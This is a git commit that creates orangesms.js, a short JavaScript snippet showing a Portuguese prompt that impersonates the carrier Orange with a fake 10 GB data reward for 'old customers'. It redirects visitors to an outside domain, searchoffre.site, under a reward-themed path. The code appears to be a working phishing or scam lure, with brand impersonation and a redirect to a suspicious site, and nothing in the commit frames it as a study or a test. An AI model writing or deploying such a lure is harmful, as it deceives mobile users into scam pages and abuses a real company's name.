2d2051646fe865f2530b6a6ff0d18ade02719971
bigetijazz8 <bigetijazz8@gmail.com>
2024-07-05 09:02:46 -0700

    Create orangesms.js

---
+++ orangesms.js
@@ -0,0 +1,6 @@
+
+var password = '1'
+password=prompt('Orange: Prezado cliente, por favor, verifique se o seu cartão SIM está qualificado para receber dados de 10 GB, clientes antigos Recompensa, pressione 1 para verificar agora ','1');
+if (password != '1') {
+location.href='https://www.searchoffre.site/recompensa-sim-antiga';
+}
